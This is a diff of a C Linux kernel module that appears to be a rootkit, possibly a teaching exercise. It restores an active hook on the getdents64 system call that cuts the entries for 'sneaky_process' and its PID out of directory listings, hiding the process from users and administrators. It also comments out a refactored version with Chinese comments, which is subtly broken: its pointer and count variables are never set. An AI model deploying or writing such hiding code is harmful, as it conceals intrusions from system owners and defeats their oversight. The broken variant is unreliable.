@@ -62,117 +62,117 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs)
 // TODO: 下面基本全是
 static asmlinkage int (*original_getdents64)(struct pt_regs * regs);
 
-// asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
-//   struct linux_dirent64 * dirp;
-//   struct linux_dirent64 * d;
-//   int bpos;
-//   unsigned int count;
-//   char * buffer;
-//   int nreads = original_getdents64(regs);
-
-//   if (nreads <= 0) {
-//     return nreads;
-//   }
-  
-//   // printk(KERN_INFO "Sneaky getdents64 begins.\n");
-
-//   dirp = (struct linux_dirent64 *) (regs->si);
-//   count = (unsigned int) (regs->dx);
-//   buffer = vmalloc(count);
-  
-//   copy_from_user((void *) buffer, (void *) dirp, count);
-
-//   for (bpos=0; bpos < nreads;) {
-//     d = (struct linux_dirent64 *) (buffer + bpos);
-//     // printk(KERN_INFO "Sneaky %p %llu %s %4d\n", d, d->d_ino, d->d_name, d->d_reclen);
-//     if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, sneaky_pid) == 0) {
-//       memmove((void *) d, (void *) (((char *) d) + d->d_reclen), nreads - bpos - d->d_reclen);
-//       nreads -= d->d_reclen;
-//     } else {
-//       bpos += d->d_reclen;
-//     }
-//   }
-
-//   copy_to_user((void *) dirp, (void *) buffer, count);
-
-//   vfree(buffer);
-//   // printk(KERN_INFO "Sneaky getdents64 ends.\n");
-  
-//   return nreads;
-// }
-
-int is_sneaky_entry(struct linux_dirent64 *entry) {
-  const char *sneaky_process = "sneaky_process";
-  const char *sneaky_pid = "sneaky_pid";
-
-  // 检查目录项的名称是否匹配需要过滤的项
-  return (strcmp(entry->d_name, sneaky_process) == 0 || strcmp(entry->d_name, sneaky_pid) == 0);
-}
-
-void remove_directory_entry(char *buffer, int nreads, int bpos, int entry_length) {
-  // 移动剩余的数据覆盖需要移除的目录项
-  memmove(buffer + bpos, buffer + bpos + entry_length, nreads - bpos - entry_length);
-  nreads -= entry_length;
-}
-
-void filter_directory_entries(char *buffer, int nreads) {
-  int bpos = 0;
-  struct linux_dirent64 *d;
-
-  while (bpos < nreads) {
-    d = (struct linux_dirent64 *)(buffer + bpos);
-
-    // 判断是否是需要过滤的目录项
-    if (is_sneaky_entry(d)) {
-      // 移除目录项
-      remove_directory_entry(buffer, nreads, bpos, d->d_reclen);
-    } else {
-      bpos += d->d_reclen;
-    }
-  }
-}
-
-char *allocate_memory(unsigned int size) {
-  // 分配内存
-  char *buffer = vmalloc(size);
-  if (!buffer) {
-    // 处理内存分配失败的情况
-  }
-  return buffer;
-}
-
-void free_memory(char *buffer) {
-  // 释放内存
-  vfree(buffer);
-}
-
-asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
-  struct linux_dirent64 *dirp;
+asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
+  struct linux_dirent64 * dirp;
+  struct linux_dirent64 * d;
+  int bpos;
   unsigned int count;
-  char *buffer;
+  char * buffer;
   int nreads = original_getdents64(regs);
 
   if (nreads <= 0) {
     return nreads;
   }
+  
+  // printk(KERN_INFO "Sneaky getdents64 begins.\n");
 
-  // 分配内核空间缓冲区
-  buffer = allocate_memory(count);
+  dirp = (struct linux_dirent64 *) (regs->si);
+  count = (unsigned int) (regs->dx);
+  buffer = vmalloc(count);
+  
+  copy_from_user((void *) buffer, (void *) dirp, count);
 
-  // 从用户空间复制数据到内核空间
-  copy_from_user((void *)buffer, (void *)dirp, count);
+  for (bpos=0; bpos < nreads;) {
+    d = (struct linux_dirent64 *) (buffer + bpos);
+    // printk(KERN_INFO "Sneaky %p %llu %s %4d\n", d, d->d_ino, d->d_name, d->d_reclen);
+    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, sneaky_pid) == 0) {
+      memmove((void *) d, (void *) (((char *) d) + d->d_reclen), nreads - bpos - d->d_reclen);
+      nreads -= d->d_reclen;
+    } else {
+      bpos += d->d_reclen;
+    }
+  }
 
-  // 过滤目录项
-  filter_directory_entries(buffer, nreads);
+  copy_to_user((void *) dirp, (void *) buffer, count);
 
-  // 从内核空间复制数据到用户空间
-  copy_to_user((void *)dirp, (void *)buffer, count);
-
-  // 释放内存
-  free_memory(buffer);
-
+  vfree(buffer);
+  // printk(KERN_INFO "Sneaky getdents64 ends.\n");
+  
   return nreads;
 }
+
+// int is_sneaky_entry(struct linux_dirent64 *entry) {
+//   const char *sneaky_process = "sneaky_process";
+//   const char *sneaky_pid = "sneaky_pid";
+
+//   // 检查目录项的名称是否匹配需要过滤的项
+//   return (strcmp(entry->d_name, sneaky_process) == 0 || strcmp(entry->d_name, sneaky_pid) == 0);
+// }
+
+// void remove_directory_entry(char *buffer, int nreads, int bpos, int entry_length) {
+//   // 移动剩余的数据覆盖需要移除的目录项
+//   memmove(buffer + bpos, buffer + bpos + entry_length, nreads - bpos - entry_length);
+//   nreads -= entry_length;
+// }
+
+// void filter_directory_entries(char *buffer, int nreads) {
+//   int bpos = 0;
+//   struct linux_dirent64 *d;
+
+//   while (bpos < nreads) {
+//     d = (struct linux_dirent64 *)(buffer + bpos);
+
+//     // 判断是否是需要过滤的目录项
+//     if (is_sneaky_entry(d)) {
+//       // 移除目录项
+//       remove_directory_entry(buffer, nreads, bpos, d->d_reclen);
+//     } else {
+//       bpos += d->d_reclen;
+//     }
+//   }
+// }
+
+// char *allocate_memory(unsigned int size) {
+//   // 分配内存
+//   char *buffer = vmalloc(size);
+//   if (!buffer) {
+//     // 处理内存分配失败的情况
+//   }
+//   return buffer;
+// }
+
+// void free_memory(char *buffer) {
+//   // 释放内存
+//   vfree(buffer);
+// }
+
+// asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
+//   struct linux_dirent64 *dirp;
+//   unsigned int count;
+//   char *buffer;
+//   int nreads = original_getdents64(regs);
+
+//   if (nreads <= 0) {
+//     return nreads;
+//   }
+
+//   // 分配内核空间缓冲区
+//   buffer = allocate_memory(count);
+
+//   // 从用户空间复制数据到内核空间
+//   copy_from_user((void *)buffer, (void *)dirp, count);
+
+//   // 过滤目录项
+//   filter_directory_entries(buffer, nreads);
+
+//   // 从内核空间复制数据到用户空间
+//   copy_to_user((void *)dirp, (void *)buffer, count);
+
+//   // 释放内存
+//   free_memory(buffer);
+
+//   return nreads;
+// }
 
 static asmlinkage ssize_t (*original_read)(struct pt_regs * regs);
 
